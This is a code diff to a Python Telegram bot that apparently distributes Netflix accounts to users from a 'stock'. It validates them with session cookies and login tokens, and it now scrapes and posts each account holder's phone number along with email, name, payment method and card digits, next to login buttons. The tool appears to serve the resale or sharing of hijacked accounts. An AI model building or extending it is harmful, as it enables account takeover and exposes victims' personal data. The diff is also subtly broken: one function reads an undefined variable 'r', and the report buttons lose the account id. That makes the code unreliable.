@@ -384,7 +384,7 @@ NFTOKEN_QUERY_PARAMS = {
     "appVersion": "15.48.1",
     "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
     "device_type": "NFAPPL-02-",
-    "esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
     "idiom": "phone",
     "iosVersion": "15.8.5",
     "isTablet": "false",
@@ -607,12 +607,12 @@ def get_assigned_account(user_id: int) -> Optional[Dict]:
         row = cur.fetchone()
         if row:
             return {
-                "id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), "plan": safe_str(row[3]),
-                "cookies": safe_str(row[4]), "nftoken": safe_str(row[5]), "nftoken_expiry": safe_str(row[6]),
-                "account_name": safe_str(row[7]), "streams": safe_int(row[8]), "quality": safe_str(row[9]),
-                "price": safe_str(row[10]), "billing_date": safe_str(row[11]), "member_since": safe_str(row[12]),
-                "payment_method": safe_str(row[13]), "card_last4": safe_str(row[14]), "phone": safe_str(row[15]),
-                "extra_member": safe_bool(row[16]), "profiles": safe_str(row[17]), "user_guid": safe_str(row[18]),
+                "id": r[0], "email": safe_str(r[1]), "country": safe_str(r[2]), "plan": safe_str(r[3]),
+                "cookies": safe_str(r[4]), "nftoken": safe_str(r[5]), "nftoken_expiry": safe_str(r[6]),
+                "account_name": safe_str(r[7]), "streams": safe_int(r[8]), "quality": safe_str(r[9]),
+                "price": safe_str(r[10]), "billing_date": safe_str(r[11]), "member_since": safe_str(r[12]),
+                "payment_method": safe_str(r[13]), "card_last4": safe_str(r[14]), "phone": safe_str(r[15]),
+                "extra_member": safe_bool(r[16]), "profiles": safe_str(r[17]), "user_guid": safe_str(r[18]),
             }
     except Exception as e:
         logger.error(f"Error in get_assigned_account: {e}")
@@ -993,6 +993,12 @@ def check_account(cookies_dict: Dict) -> Dict:
                 elif plan_key == "STANDARD":
                     streams = 2
                     
+                quality = "HD"
+                if plan_key == "PREMIUM":
+                    quality = "Ultra HD 4K"
+                elif plan_key == "STANDARD":
+                    quality = "Full HD"
+                    
                 price = None
                 for pattern in [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"']:
                     match = re.search(pattern, text, re.IGNORECASE)
@@ -1004,6 +1010,11 @@ def check_account(cookies_dict: Dict) -> Dict:
                 match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
                 if match:
                     billing = match.group(1).strip()
+                    
+                phone = None
+                match = re.search(r'"phoneNumberDigits"[^}]*"value"\s*:\s*"([^"]+)"', text, re.IGNORECASE)
+                if match:
+                    phone = match.group(1).strip()
                     
                 profiles = []
                 for match in re.finditer(r'"profiles"[^}]*"name"\s*:\s*"([^"]+)"', text, re.IGNORECASE):
@@ -1037,10 +1048,11 @@ def check_account(cookies_dict: Dict) -> Dict:
                     "plan_key": plan_key,
                     "plan_label": plan_label,
                     "streams": streams,
-                    "quality": "Ultra HD 4K" if plan_key == "PREMIUM" else "Full HD" if plan_key == "STANDARD" else "HD",
+                    "quality": quality,
                     "price": price,
                     "billing_date": billing,
                     "membership_status": membership_status,
+                    "phone": phone,
                     "profiles": profiles_str,
                     "user_guid": user_guid,
                     "nftoken": nftoken,
@@ -1058,7 +1070,7 @@ def check_account(cookies_dict: Dict) -> Dict:
         return {"valid": False, "error": "Exception"}
 
 # ============================================================
-# SEND TO CHANNEL FUNCTIONS
+# SEND TO CHANNEL FUNCTIONS - PREMIUM UI
 # ============================================================
 
 async def send_working_to_channel(bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
@@ -1072,22 +1084,36 @@ async def send_working_to_channel(bot, report_id: int, user_id: int, account_id:
             cur = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,))
             row = cur.fetchone()
             if row:
-                account = {"id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), "plan": safe_str(row[3]), "account_name": safe_str(row[15]), "streams": safe_int(row[16]), "price": safe_str(row[17]), "billing_date": safe_str(row[18]), "extra_member": safe_bool(row[23]), "profiles": safe_str(row[27]), "user_guid": safe_str(row[28]), "nftoken": safe_str(row[5]), "nftoken_expiry": safe_str(row[6])}
+                account = {
+                    "id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), 
+                    "plan": safe_str(row[3]), "account_name": safe_str(row[15]), 
+                    "streams": safe_int(row[16]), "quality": safe_str(row[17]),
+                    "price": safe_str(row[18]), "billing_date": safe_str(row[19]),
+                    "extra_member": safe_bool(row[24]), "profiles": safe_str(row[28]),
+                    "user_guid": safe_str(row[29]), "nftoken": safe_str(row[5]), 
+                    "nftoken_expiry": safe_str(row[6]), "phone": safe_str(row[23]),
+                    "membership_status": safe_str(row[25])
+                }
         if not account:
             return None
         
         token = safe_str(account.get('nftoken'))
         nft_expiry = safe_str(account.get('nftoken_expiry'))
         
+        # ============================================================
+        # PREMIUM UI - WORKING ACCOUNT POST
+        # ============================================================
         text = f"""📱 <b>WORKING ACCOUNT FOUND!</b>
 
 ━━━━━━━━━━━━━━━━━━━━━
 📧 <b>Email:</b> <code>{h(account.get('email'))}</code>
 👤 <b>Name:</b> {h(account.get('account_name'))}
+📱 <b>Phone:</b> {h(account.get('phone', 'Not provided'))}
 🌍 <b>Country:</b> {h(account.get('country'))}
 📦 <b>Plan:</b> {h(account.get('plan'))}
 🛡️ <b>Status:</b> {h(account.get('membership_status', 'Active'))}
 📺 <b>Streams:</b> {safe_int(account.get('streams'))}
+🎞️ <b>Quality:</b> {h(account.get('quality', 'HD'))}
 💰 <b>Price:</b> {h(account.get('price', 'N/A'))}
 🗓️ <b>Billing:</b> {h(account.get('billing_date'))}
 👥 <b>Extra Member:</b> {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
@@ -1096,7 +1122,7 @@ async def send_working_to_channel(bot, report_id: int, user_id: int, account_id:
 ━━━━━━━━━━━━━━━━━━━━━
 """
         if token and len(token) > 10:
-            text += f"\n⏳ <b>NFToken expires:</b> <code>{h(nft_expiry)}</code>\n"
+            text += f"⏳ <b>NFToken expires:</b> <code>{h(nft_expiry)}</code>\n"
         
         text += f"""
 ━━━━━━━━━━━━━━━━━━━━━
@@ -1108,6 +1134,9 @@ async def send_working_to_channel(bot, report_id: int, user_id: int, account_id:
 ⚠️ <b>This account is working!</b>
 """
         
+        # ============================================================
+        # LOGIN BUTTONS FIRST, THEN CONFIRM
+        # ============================================================
         keyboard = []
         if token and len(token) > 10:
             keyboard.append([
@@ -1169,18 +1198,31 @@ async def send_notworking_to_channel(bot, report_id: int, user_id: int, account_
             cur = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,))
             row = cur.fetchone()
             if row:
-                account = {"id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), "plan": safe_str(row[3]), "account_name": safe_str(row[15]), "streams": safe_int(row[16]), "price": safe_str(row[17]), "billing_date": safe_str(row[18]), "extra_member": safe_bool(row[23]), "profiles": safe_str(row[27]), "user_guid": safe_str(row[28]), "nftoken": safe_str(row[5]), "nftoken_expiry": safe_str(row[6])}
+                account = {
+                    "id": row[0], "email": safe_str(row[1]), "country": safe_str(row[2]), 
+                    "plan": safe_str(row[3]), "account_name": safe_str(row[15]), 
+                    "streams": safe_int(row[16]), "quality": safe_str(row[17]),
+                    "price": safe_str(row[18]), "billing_date": safe_str(row[19]),
+                    "extra_member": safe_bool(row[24]), "profiles": safe_str(row[28]),
+                    "user_guid": safe_str(row[29]), "nftoken": safe_str(row[5]), 
+                    "nftoken_expiry": safe_str(row[6]), "phone": safe_str(row[23]),
+                    "membership_status": safe_str(row[25])
+                }
         if not account:
             return None
         
         token = safe_str(account.get('nftoken'))
         nft_expiry = safe_str(account.get('nftoken_expiry'))
         
+        # ============================================================
+        # PREMIUM UI - NOT WORKING ACCOUNT POST
+        # ============================================================
         text = f"""❌ <b>NOT WORKING ACCOUNT REPORTED!</b>
 
 ━━━━━━━━━━━━━━━━━━━━━
 📧 <b>Email:</b> <code>{h(account.get('email'))}</code>
 👤 <b>Name:</b> {h(account.get('account_name'))}
+📱 <b>Phone:</b> {h(account.get('phone', 'Not provided'))}
 🌍 <b>Country:</b> {h(account.get('country'))}
 📦 <b>Plan:</b> {h(account.get('plan'))}
 ━━━━━━━━━━━━━━━━━━━━━
@@ -1201,6 +1243,9 @@ async def send_notworking_to_channel(bot, report_id: int, user_id: int, account_
 ⚠️ <b>Dismiss = Account will be REMOVED from stock</b>
 """
         
+        # ============================================================
+        # LOGIN BUTTONS FIRST, THEN ACTIONS
+        # ============================================================
         keyboard = []
         if token and len(token) > 10:
             keyboard.append([
@@ -1473,7 +1518,7 @@ async def check_force_sub(bot, user_id: int) -> Tuple[bool, List[InlineKeyboardB
         return True, []
 
 # ============================================================
-# TELEGRAM BOT USER HANDLERS
+# TELEGRAM BOT USER HANDLERS - FIXED START
 # ============================================================
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1513,19 +1558,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not plan_display:
             plan_display = "│ No accounts available\n"
         
+        # ============================================================
+        # FIXED: Working/Not working buttons ONLY if account assigned
+        # ============================================================
         assigned = get_assigned_account(user_id)
+        
         keyboard = [
             [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
         ]
+        
+        # Only show Working/Not Working if user has an assigned account
         if assigned:
             keyboard.append([
-                InlineKeyboardButton("✅ Working", callback_data=f"report_working_{assigned['id']}"),
-                InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{assigned['id']}"),
+                InlineKeyboardButton("✅ Working", callback_data="working"),
+                InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
             ])
+        
         keyboard.append([
             InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
             InlineKeyboardButton("📊 My Status", callback_data="my_status"),
         ])
+        
         if safe_bool(user_data.get("is_admin")) or user_id in ADMIN_IDS:
             keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
         
@@ -1594,6 +1647,9 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = safe_str(account.get('nftoken'))
         nft_expiry = safe_str(account.get('nftoken_expiry'))
         
+        # ============================================================
+        # PREMIUM UI - ACCOUNT DETAILS WITH ALL FIELDS
+        # ============================================================
         text = f"""🎉 <b>ACCOUNT ASSIGNED!</b>
 ━━━━━━━━━━━━━━━━━━━━━
 📧 <b>Email:</b> <code>{h(account.get('email'))}</code>
@@ -1603,7 +1659,7 @@ async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📦 <b>Plan:</b> {h(account.get('plan'))}
 🛡️ <b>Status:</b> {h(account.get('membership_status', 'Active'))}
 📺 <b>Streams:</b> {safe_int(account.get('streams'))}
-🎞️ <b>Quality:</b> {h(account.get('quality'))}
+🎞️ <b>Quality:</b> {h(account.get('quality', 'HD'))}
 💰 <b>Price:</b> {h(account.get('price', 'N/A'))}
 🗓️ <b>Billing:</b> {h(account.get('billing_date'))}
 👥 <b>Extra Member:</b> {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
